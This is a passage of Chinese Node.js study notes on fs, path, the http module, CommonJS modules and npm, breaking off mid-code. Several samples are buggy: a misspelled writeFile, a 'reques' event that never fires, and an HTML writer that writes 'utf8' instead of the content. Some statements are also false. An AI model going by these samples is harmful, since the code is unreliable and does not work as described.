class="code"><pre><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br></pre></td></tr></table></figure><p>###fs.readFile()的语法格式</p><p>如果在参数列表中的参数被中括号包括起来，表示其是一个可选参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">fs.<span class="title function_">readFile</span>(path[,options],callback</span><br></pre></td></tr></table></figure><blockquote><p>参数一：必选参数，字符串，表示文件的路径</p><p>参数二：可选参数，表示以什么编码方式来读取文件</p><p>参数三：必选参数，文件读取完成后，通过回调函数拿到读取的结果</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;路径&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err,dataStr</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="判断文件是否读取成功"><a href="#判断文件是否读取成功" class="headerlink" title="判断文件是否读取成功"></a>判断文件是否读取成功</h3><p>可以判断err对象是否为null，从而知晓</p><h2 id="2-向指定的文件中写入内容"><a href="#2-向指定的文件中写入内容" class="headerlink" title="2.向指定的文件中写入内容"></a>2.向指定的文件中写入内容</h2><p>###fs.writeFile()的语法格式</p><p>使用这个方法，可以写入文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd.<span class="title function_">writrFile</span>(file,data[,options],callback)</span><br></pre></td></tr></table></figure><blockquote><p>参数一：必选参数，需要指定一个文件路径的字符串，表示文件的存储路劲</p><p>参数二：必选参数，表示要写入的内容</p><p>参数三：可选参数，表示以什么文件格式写入，默认utf8</p><p>参数四：必选参数，文件写入完成后的回调函数</p></blockquote><p><strong>需要注意的是，如果路径已经存在，那么或覆盖原有的内容</strong></p><p>###判断文件是否写入成功</p><p>如果写入成功，那么err的值等于null</p><p>如果写入失败，err的值是一个错误对象</p><h2 id="3-处理路径问题"><a href="#3-处理路径问题" class="headerlink" title="3.处理路径问题"></a>3.处理路径问题</h2><h3 id="fs模块-路径动态拼接的问题"><a href="#fs模块-路径动态拼接的问题" class="headerlink" title="fs模块-路径动态拼接的问题"></a>fs模块-路径动态拼接的问题</h3><p>在使用fs模块时，如果使用的时.&#x2F;或者..&#x2F;开头的相对路径时，很容易出现动态拼接错误的问题。</p><p>__原因__：在代码运行的时候，&#x3D;&#x3D;会以执行node命令时所处的目录&#x3D;&#x3D;，动态拼接出被操作文件的完整路径。</p><p><strong>解决方法</strong>:直接使用绝对路径。</p><p>__注意__：在js中，一个反斜杠“&quot;表示转移符，需要写两个反斜杠才表示一个反斜杠”\“。</p><p><strong>缺点</strong>：移植性非常差，并且不利于维护</p><p><strong>解决方法</strong>:&#x3D;&#x3D;__dirname&#x3D;&#x3D;表示当前文件所处的目录，&#x3D;&#x3D;不会被node命令所处目录变化而变化&#x3D;&#x3D;。</p><p>例如</p><h3 id="03-1使用path路径模块"><a href="#03-1使用path路径模块" class="headerlink" title="03.1使用path路径模块"></a>03.1使用path路径模块</h3><p>path是用来专门处理路径的模块，他提供了一系列的方法和属性，用来满足用户对路径的处理需求。</p><p> exp</p><blockquote><p>path.join()方法：用来将多个路径片段拼接成一个完整的路径字符串。</p><p>path.basename()方法：用来从路径字符串中，将文件名字解析出来。</p></blockquote><p>需要以下导入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path=<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="03-2路径拼接"><a href="#03-2路径拼接" class="headerlink" title="03.2路径拼接"></a>03.2路径拼接</h3><p>path.join()的代码示例：</p><p>&#x3D;&#x3D;注意:&#x3D;&#x3D;在&#x3D;&#x3D;..&#x2F;&#x3D;&#x3D;之前的一个字符串将被抵消。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//../抵消</span></span><br><span class="line"><span class="keyword">const</span> pathStr=path.<span class="title function_">join</span>(<span class="string">&#x27;/a&#x27;</span>, <span class="string">&#x27;/b/c&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/e&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pathStr)<span class="comment">//输出\a\b\d\e</span></span><br></pre></td></tr></table></figure><p><strong>以后进行拼接时尽量使用path.join(),可以避免错误输入路径带来的某些错误（.)</strong></p><h3 id="03-3获取路径中的文件名"><a href="#03-3获取路径中的文件名" class="headerlink" title="03-3获取路径中的文件名"></a>03-3获取路径中的文件名</h3><p>**1.path.basename():**可以获取路径中的最后一部分，可以使用这个方法获取路径中的文件名，格式如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path.<span class="title function_">basename</span>(path[,ext])</span><br></pre></td></tr></table></figure><p><strong>代码示例</strong>，使用这个方法，可以从一个文件路径中，获取到文件的名称部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/a/b/c/index.html&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fullname = path.<span class="title function_">basename</span>(fpath)</span><br><span class="line"><span class="keyword">const</span> fullname2 = path.<span class="title function_">basename</span>(fpath, <span class="string">&#x27;.html&#x27;</span>)<span class="comment">//消除扩展名</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fullname)<span class="comment">//拿到文件名</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fullname2)</span><br></pre></td></tr></table></figure><h3 id="03-4如何获取路径中的文件扩展名"><a href="#03-4如何获取路径中的文件扩展名" class="headerlink" title="03-4如何获取路径中的文件扩展名"></a>03-4如何获取路径中的文件扩展名</h3><p><strong>语法格式</strong>：path.extname()的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fpath = <span class="string">&#x27;/a/b/c/index.html&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fext = path.<span class="title function_">extname</span>(fpath)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fext)<span class="comment">//.html</span></span><br></pre></td></tr></table></figure><h3 id="03-5时钟案例"><a href="#03-5时钟案例" class="headerlink" title="03-5时钟案例"></a>03-5时钟案例</h3><p>步骤：</p><p>​1.创建两个正则表达式，用来匹配<style>和<scipt>标签</p><p>​2.使用fs模块，读取需要被处理的HTML文件</p><p>​3.自定义resolveCSS方法，写入index.css文件</p><p>​4.自定义resolveJs方法，写入index.js文件</p><p>​5.自定义resolveHtml方法，写入index.html文件</p><p>resolveCSS()方法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolveCSS</span>(<span class="params">htmlStr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> r1 = regStyle.<span class="title function_">exec</span>(htmlStr)</span><br><span class="line">  <span class="keyword">const</span> newCSS = r1[<span class="number">0</span>].<span class="title function_">replace</span>(<span class="string">&#x27;&lt;style&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&lt;/style&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="comment">//写入index.css文件</span></span><br><span class="line">  fs.<span class="title function_">writeFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;../素材1/index.css&#x27;</span>), newCSS, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入CSS样式失败！&#x27;</span> + err.<span class="property">message</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入样式文件成功!&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>resolveJs()方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolveJs</span>(<span class="params">htmlStr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> r2 = regJs.<span class="title function_">exec</span>(htmlStr)</span><br><span class="line">  <span class="keyword">const</span> newJs = r2[<span class="number">0</span>].<span class="title function_">replace</span>(<span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&lt;/script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="comment">//写入index.css文件</span></span><br><span class="line">  fs.<span class="title function_">writeFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;../素材1/index.js&#x27;</span>), newJs, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入JS文件失败！&#x27;</span> + err.<span class="property">message</span>)</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入JS文件成功!&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rsolveHTML()方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">resolveHTML</span>(<span class="params">htmlStr</span>) &#123;</span><br><span class="line">  <span class="comment">//调用replace方法</span></span><br><span class="line">  <span class="keyword">const</span> newHTML=htmlStr.<span class="title function_">replace</span>(</span><br><span class="line">    regStyle,<span class="string">`&lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;`</span></span><br><span class="line">  ).<span class="title function_">replace</span>(</span><br><span class="line">    regJs,<span class="string">&#x27;&lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;&#x27;</span></span><br><span class="line">  )</span><br><span class="line">  <span class="comment">//写入</span></span><br><span class="line">  fs.<span class="title function_">writeFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./素材1/index.html&#x27;</span>), <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入HTML文件失败！&#x27;</span>+err.<span class="property">message</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写入HTML文件成功！&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注意点&#x3D;&#x3D;</p><blockquote><p>1.一定要新建一个文件夹</p><p>2.使用fs.write()方法写入内容时，重复写入会导致新内容覆盖旧内容</p></blockquote><h2 id="4-HTTP模块"><a href="#4-HTTP模块" class="headerlink" title="4.HTTP模块"></a>4.HTTP模块</h2><p>###4.1什么是HTTP模块</p><p>&#x3D;&#x3D;概念&#x3D;&#x3D;</p><p>在网络节点，负责消费资源的电脑，叫做客户端；负责对外提供网络资源的电脑，叫做服务器。</p><p>&#x3D;&#x3D;方法&#x3D;&#x3D;</p><p>http模块中的http.createServer()方法，能把一台普通的电脑，变成一台Web服务器</p><p>&#x3D;&#x3D;引入&#x3D;&#x3D;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="4-2进一步理解http模块的作用"><a href="#4-2进一步理解http模块的作用" class="headerlink" title="4.2进一步理解http模块的作用"></a>4.2进一步理解http模块的作用</h3><p>&#x3D;&#x3D;服务器和普通电脑的区别&#x3D;&#x3D;</p><p>服务器和普通电脑的区别，服务器上安装了Web服务器软件，例如：IIS，Apache等，通过这些服务器软件，能把一台普通的电脑变成一台Web服务器。</p><p><strong>在nodejs中，我们不需要这些软件，我们可以通过HTTP模块创建一个服务器</strong></p><h3 id="4-3服务器相关概念"><a href="#4-3服务器相关概念" class="headerlink" title="4.3服务器相关概念"></a>4.3服务器相关概念</h3><p>&#x3D;&#x3D;IP地址&#x3D;&#x3D;</p><ul><li><p>互联网上每台计算机的唯一标识。</p></li><li><p>格式：“点分十进制”，a.b.c.d，其中abcd都是0-255之间的十进制整数。</p></li><li><p><strong>在cmd中输入ping 网站 可以获取网站IP地址</strong></p></li><li><p>在自己电脑中输入127.0.0.1就可以访问本机了。</p></li></ul><p>&#x3D;&#x3D;域名和域名服务器&#x3D;&#x3D;</p><ul><li><p>IP地址不够直观，因此发明了域名来方便人们记忆</p></li><li><p>IP地址和域名是一一对应的关系，这种关系存放在一种叫做**域名服务器(DNS)**的电脑中。</p></li></ul><p><strong>注意</strong></p><p>127.0.0.1对应的域名是localhost</p><p>&#x3D;&#x3D;端口号&#x3D;&#x3D;</p><p> 一台电脑中，可以运行很多个Web服务，每个Web都对应一个唯一的端口号，通过端口号，可以将网络请求准确的发给对应的Web服务。</p><p><strong>注意</strong></p><ul><li><p>每个端口号不能被同时多个Web服务占用</p></li><li><p>在是基于应用中，只有80端口可以在URL中省略。</p></li></ul><h3 id="4-4创建最基本的Web服务器"><a href="#4-4创建最基本的Web服务器" class="headerlink" title="4.4创建最基本的Web服务器"></a>4.4创建最基本的Web服务器</h3><h4 id="1-创建最基本的Web服务器的步骤"><a href="#1-创建最基本的Web服务器的步骤" class="headerlink" title="1.创建最基本的Web服务器的步骤"></a>1.创建最基本的Web服务器的步骤</h4><ol><li>导入http模块</li><li>创建Web服务器示例</li><li>为服务器绑定request时间，监听客户端请求</li><li>启动服务器</li></ol><h4 id="2-示例代码"><a href="#2-示例代码" class="headerlink" title="2.示例代码"></a>2.示例代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建示例</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.绑定request</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;reques&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;某人访问了服务器....&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.启动</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server running...&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="4-5-REQ"><a href="#4-5-REQ" class="headerlink" title="4.5.REQ"></a>4.5.REQ</h3><p>3.req请求对象，只要服务器收到了客户端的请求，就会调用通过server.on()位服务器绑定的事件处理函数</p><p>包含了与客户端相关的数据和属性</p><blockquote><p>req.url是客户端请求的URL地址</p><p>req.method是客户端请求的method类型</p></blockquote><h3 id="4-6时钟Web服务器案例"><a href="#4-6时钟Web服务器案例" class="headerlink" title="4.6时钟Web服务器案例"></a>4.6时钟Web服务器案例</h3><h4 id="1-核心思路"><a href="#1-核心思路" class="headerlink" title="1.核心思路"></a>1.核心思路</h4><blockquote><p>将每个文件的实际存放路径，作为每个资源的请求URL地址</p></blockquote><h4 id="2-实现步骤"><a href="#2-实现步骤" class="headerlink" title="2.实现步骤"></a>2.实现步骤</h4><ol><li>导入需要的模块</li><li>创建基本Web服务器</li><li>将资源url地址作为文件存放路径</li><li>读取文件内容并响应客户端</li><li>优化资源请求路径</li></ol><h4 id="3-导入需要的模块"><a href="#3-导入需要的模块" class="headerlink" title="3.导入需要的模块"></a>3.导入需要的模块</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path=<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="4-将资源url作为文件存放路径"><a href="#4-将资源url作为文件存放路径" class="headerlink" title="4.将资源url作为文件存放路径"></a>4.将资源url作为文件存放路径</h4><p>获取到的请求路径:&#x3D;&#x3D;&#x2F;index.html&#x3D;&#x3D;</p><h4 id="5-读取文件内容并发送给客户端"><a href="#5-读取文件内容并发送给客户端" class="headerlink" title="5.读取文件内容并发送给客户端"></a>5.读取文件内容并发送给客户端</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fs.<span class="title function_">readFile</span>(fpath, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, dataStr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//4.2读取失败</span></span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&#x27;404 Not Found&#x27;</span>)</span><br><span class="line">  <span class="comment">//4.3读取成功</span></span><br><span class="line">  res.<span class="title function_">end</span>(dataStr)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>如果获取的文件内容中引用了其他文件，那么浏览器会自动请求</p></blockquote><h4 id="6-优化请求资源的路径"><a href="#6-优化请求资源的路径" class="headerlink" title="6.优化请求资源的路径"></a>6.优化请求资源的路径</h4><p>如果请求根路径，那么就用&#x2F;clock&#x2F;index.html来代替</p><h2 id="5-模块化"><a href="#5-模块化" class="headerlink" title="5.模块化"></a>5.模块化</h2><h3 id="5-1是么是模块化"><a href="#5-1是么是模块化" class="headerlink" title="5.1是么是模块化"></a>5.1是么是模块化</h3><h4 id="1-编程领域中的模块化"><a href="#1-编程领域中的模块化" class="headerlink" title="1.编程领域中的模块化"></a>1.编程领域中的模块化</h4><p>此处的模块化，就是固定遵守的规则，把一个大文件拆分成独立并且互相依赖的多个小模块。</p><p><strong>好处</strong></p><blockquote><p>提高了代码复用性</p><p>提高了代码可维护性</p><p>可以实现按需加载</p></blockquote><h3 id="5-2模块化规范"><a href="#5-2模块化规范" class="headerlink" title="5.2模块化规范"></a>5.2模块化规范</h3><p>模块规范化就是在对代码进行模块化的拆分与组合时，需要遵守的那些规则</p><p>好处：降低了沟通的成本，极大方便了各个模块的相互调用</p><h2 id="6-Nodejs中的模块化"><a href="#6-Nodejs中的模块化" class="headerlink" title="6.Nodejs中的模块化"></a>6.Nodejs中的模块化</h2><h3 id="6-1模块的分类"><a href="#6-1模块的分类" class="headerlink" title="6.1模块的分类"></a>6.1模块的分类</h3><blockquote><p><strong>内置模块</strong>：内置模块是由Nodejs官方提供的，例如fs，path,http等等</p><p><strong>自定义模块</strong>：用户创建的每个.js文件，都是自定义模块</p><p><strong>第三方模块</strong>:由第三方开发出的模块，不是官方也不是用户提供的</p></blockquote><h3 id="6-2加载模块"><a href="#6-2加载模块" class="headerlink" title="6.2加载模块"></a>6.2加载模块</h3><p>使用强大的&#x3D;&#x3D;require&#x3D;&#x3D;方法，可以加载需要的各种模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载内置模块</span></span><br><span class="line"><span class="keyword">const</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="comment">//加载用户自定义模块，如果去掉.js后缀名也能运行</span></span><br><span class="line"><span class="keyword">const</span> custom=<span class="built_in">require</span>(<span class="string">&#x27;./custom.js&#x27;</span>)</span><br><span class="line"><span class="comment">//加载第三方模块</span></span><br><span class="line"><span class="keyword">const</span> moment=<span class="built_in">require</span>(<span class="string">&#x27;moment&#x27;</span>)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;使用其他模块时，调用时就会加载模块的代码&#x3D;&#x3D;</p><h3 id="6-3模块作用域"><a href="#6-3模块作用域" class="headerlink" title="6.3模块作用域"></a>6.3模块作用域</h3><h4 id="1-什么是作用域"><a href="#1-什么是作用域" class="headerlink" title="1.什么是作用域"></a>1.什么是作用域</h4><p>和函数作用域类似，自定义模块中的方法、变量等等，只能在当前模块内被访问，这种模块级别的访问限制，叫做模块作用域</p><h4 id="2-好处"><a href="#2-好处" class="headerlink" title="2.好处"></a>2.好处</h4><p>防止全局变量污染的问题</p><p><img src="C:\Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240321205245056.png" alt="image-20240321205245056"></p><p><img src="C:\Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240321205419593.png" alt="image-20240321205419593"></p><h3 id="6-4向外共享模块作用域中的成员"><a href="#6-4向外共享模块作用域中的成员" class="headerlink" title="6.4向外共享模块作用域中的成员"></a>6.4向外共享模块作用域中的成员</h3><h4 id="1-module对象"><a href="#1-module对象" class="headerlink" title="1.module对象"></a>1.module对象</h4><p>每个.js自定义文件中都有一个module对象，他存储了当前模块的数据等等</p><p><img src="C:\Users\南渡的南\AppData\Roaming\Typora\typora-user-images\image-20240321205637062.png" alt="image-20240321205637062"></p><h4 id="2-module-exports对象"><a href="#2-module-exports对象" class="headerlink" title="2.module.exports对象"></a>2.module.exports对象</h4><p>在自定义模块中，可以使用这个对象可以将模块内的成员共享出去；</p><p>外界使用require()方法导入自定义模块时，得到的就是module.exports所指向的对象</p><p>&#x3D;&#x3D;在一个自定义模块中，默认的module.exports对象就是空对象，也就是module对象&#x3D;&#x3D;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">sayHello</span>=<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`我是<span class="subst">$&#123;usename&#125;</span>`</span>)</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">usename</span> = <span class="string">&#x27;zs&#x27;</span><span class="comment">//像module.exports中挂载一个属性</span></span><br></pre></td></tr></table></figure><p><img src="/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.assets/image-20240321222048156.png" alt="image-20240321222048156"></p><h4 id="3-共享成员的注意点"><a href="#3-共享成员的注意点" class="headerlink" title="3.共享成员的注意点"></a>3.共享成员的注意点</h4><p>使用require()方法导入模块时，导入的结果，永远以module.exports指向的对象为准</p><h4 id="4-exports对象"><a href="#4-exports对象" class="headerlink" title="4.exports对象"></a>4.exports对象</h4><p>module.exports和exports指向的是同一个对象</p><p>最终指向的值，&#x3D;&#x3D;以module.exports&#x3D;&#x3D;指向的对象为准</p><h4 id="5-module-exports和exports使用误区"><a href="#5-module-exports和exports使用误区" class="headerlink" title="5.module.exports和exports使用误区"></a>5.module.exports和exports使用误区</h4><blockquote><ol><li>使用require时，得到的永远都是module.exports对象</li></ol></blockquote><p>为了防止混乱，建议大家不要在同一个模块中同时使用两者</p><h3 id="6-5Nodejs中的模块化规范"><a href="#6-5Nodejs中的模块化规范" class="headerlink" title="6.5Nodejs中的模块化规范"></a>6.5Nodejs中的模块化规范</h3><p>nodejs遵循了<strong>CommonJS模块化规范</strong>，其规定了模块的特性和各模块之间如何互相依赖</p><p><strong>CommonJS规定：</strong></p><blockquote><p>1.每个模块内部，module变量代表当前某块</p><p>2.module变量是一个对象，他的exports属性(即module.exports)是对外的接口</p><p>3.加载某个模块，其实是加载该模块的module.exports属性，require()方法用于加载模块</p></blockquote><h2 id="7-npm与包"><a href="#7-npm与包" class="headerlink" title="7.npm与包"></a>7.npm与包</h2><h3 id="7-1初步入门"><a href="#7-1初步入门" class="headerlink" title="7.1初步入门"></a>7.1初步入门</h3><h4 id="什么是包"><a href="#什么是包" class="headerlink" title="什么是包"></a>什么是包</h4><p>Nodejs中的第三方模块又叫做包</p><h4 id="包的来源"><a href="#包的来源" class="headerlink" title="包的来源"></a>包的来源</h4><p>Nodejs的内置模块和自定义模块，都是由第三方团队制作的</p><h4 id="为什么需要"><a href="#为什么需要" class="headerlink" title="为什么需要"></a>为什么需要</h4><p>&#x3D;&#x3D;原因&#x3D;&#x3D;Nodejs的内置某块仅提供了一些底层的api，导致开发时效率低</p><p>包是基于内置模块封装出来的</p><h4 id="怎么下载"><a href="#怎么下载" class="headerlink" title="怎么下载"></a>怎么下载</h4><p>npm公司 &lt;<a href="http://www.npmjs.com>是全球最大的包共享平台">www.npmjs.com&gt;是全球最大的包共享平台</a></p><p>npm公司还提供了一个地址为 <a href="https://registy.npmjs.org/%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%9D%A5%E5%AF%B9%E5%A4%96%E5%85%B1%E4%BA%AB%E6%89%80%E6%9C%89%E7%9A%84%E5%8C%85%EF%BC%8C%E4%BD%86%E6%98%AF%E5%85%B6%E6%89%93%E4%B8%8D%E5%BC%80%E3%80%82">https://registy.npmjs.org/的服务器，来对外共享所有的包，但是其打不开。</a></p><h4 id="如何下载"><a href="#如何下载" class="headerlink" title="如何下载"></a>如何下载</h4><p>这个包管理工具叫做&#x3D;&#x3D;Node Package Manager&#x3D;&#x3D;(简称npm包管理工具)</p><h3 id="7-2npm初体验"><a href="#7-2npm初体验" class="headerlink" title="7.2npm初体验"></a>7.2npm初体验</h3><h4 id="1-格式化实践的传统做法"><a href="#1-格式化实践的传统做法" class="headerlink" title="1.格式化实践的传统做法"></a>1.格式化实践的传统做法</h4><p>dateFormat()方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 